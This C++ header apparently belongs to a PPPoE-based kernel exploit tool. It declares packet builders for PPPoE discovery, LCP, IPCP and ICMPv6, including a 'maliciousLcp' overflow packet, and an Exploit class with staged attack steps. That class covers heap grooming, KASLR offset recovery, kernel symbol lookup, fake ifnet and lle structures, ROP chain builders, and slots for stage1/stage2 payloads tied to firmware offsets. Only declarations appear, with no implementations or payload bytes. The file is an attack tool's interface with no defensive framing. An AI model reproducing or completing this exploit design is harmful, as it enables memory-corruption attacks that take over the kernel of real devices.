#pragma once

#include <functional>
#include <vector>
#include <cstdint>
#include <string>
#include <scapy/pcap.hpp>
#include <scapy/layers/pppoe.hpp>
#include "offset.h"
#include "defines.h"

#ifdef DEBUG
#define hexdump(p) PacketBuilder::hexPrint(p)
#define hexdump_verbose(p) (void) p
#else
#define hexdump(p) (void) p
#define hexdump_verbose(p) (void) p
#endif

class PacketBuilder {
public:
    static void hexPrint(const scapy::Packet &packet);

    static scapy::Packet lcpEchoReply(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                                      uint16_t session, uint8_t id, uint32_t magic_number);

    static scapy::Packet pado(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                              const uint8_t *ac_cookie, size_t ac_cookie_len,
                              const uint8_t *host_uniq, size_t host_uniq_len);

    static scapy::Packet pads(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                              const uint8_t *host_uniq, size_t host_uniq_len);

    static scapy::Packet padt(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac);

    static scapy::Packet lcpRequest(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac);

    static scapy::Packet lcpAck(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac, uint8_t id);

    static scapy::Packet ipcpRequest(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac);

    static scapy::Packet ipcpNak(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac, uint8_t id);

    static scapy::Packet ipcpAck(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac, uint8_t id,
                                 const uint8_t *option, size_t option_len);

    static scapy::Packet icmpv6Echo(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                                    const scapy::IPv6Address &source_ipv6, const scapy::IPv6Address &target_ipv6);

    static scapy::Packet icmpv6Na(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                                  const scapy::IPv6Address &source_ipv6, const scapy::IPv6Address &target_ipv6);

    static scapy::Packet pinCpu0(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac);

    static scapy::Packet maliciousLcp(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac,
                                      const uint8_t *overflow, size_t overflow_len);

    static scapy::Packet lcpTerminate(const scapy::MacAddress &source_mac, const scapy::MacAddress &target_mac);

    static scapy::PPPoESessionLayer *getPPPoESessionLayer(const scapy::Packet &packet, uint16_t pppType);

    static scapy::PPPoEDiscoveryLayer *getPPPoEDiscoveryLayer(const scapy::Packet &packet, uint8_t type);
};

class LcpEchoHandler {
public:
    explicit LcpEchoHandler(const std::string &iface);

    void run();

    void stop();

    ~LcpEchoHandler();

private:
    scapy::PcapLiveDevice *dev;
    bool running{};
};

class Exploit {
public:
    Exploit() = default;

    ~Exploit();

    int setFirmwareVersion(FirmwareVersion version);

    int setInterface(const std::string &iface);

    void setStage1(const std::vector<uint8_t> &&stage1_data);

    void setStage2(const std::vector<uint8_t> &&stage2_data);

    void setTimeout(int timeout);

    void setWaitPADI(bool wait);

    void setGroomDelay(int wait);

    void closeInterface();

    void updateSourceMac(uint64_t value);

    uint64_t kdlsym(uint64_t addr) const;

    int lcp_negotiation() const;

    int ipcp_negotiation() const;

    int ppp_negotiation(const std::function<std::vector<uint8_t>(Exploit *)> &cb = nullptr,
                        bool ignore_initial_req = false);

    void ppp_byebye();

    static std::vector<uint8_t> build_fake_ifnet(Exploit *self);

    static std::vector<uint8_t> build_overflow_lle(Exploit *self);

    static std::vector<uint8_t> build_fake_lle(Exploit *self);

    static std::vector<uint8_t> build_first_rop(Exploit *self, uint64_t fake_lle_len, uint64_t rop2_len);

    static std::vector<uint8_t> build_second_rop(Exploit *self);

    int stage0();

    int stage1();

    int stage2();

    int stage3();

    int stage4();

    int run();

    void stop();

    scapy::PcapLiveDevice *dev{};
    uint64_t pppoe_softc{};
    uint64_t pppoe_softc_list{};
    uint64_t kaslr_offset{};
    scapy::MacAddress target_mac, source_mac;
    scapy::IPv6Address target_ipv6;
    OffsetsFirmware offs{};
    std::vector<uint8_t> stage1_bin{};
    std::vector<uint8_t> stage2_bin{};
    bool auto_retry{};
    bool wait_padi{};
    int timeout{};
    int groom_delay{4};
};
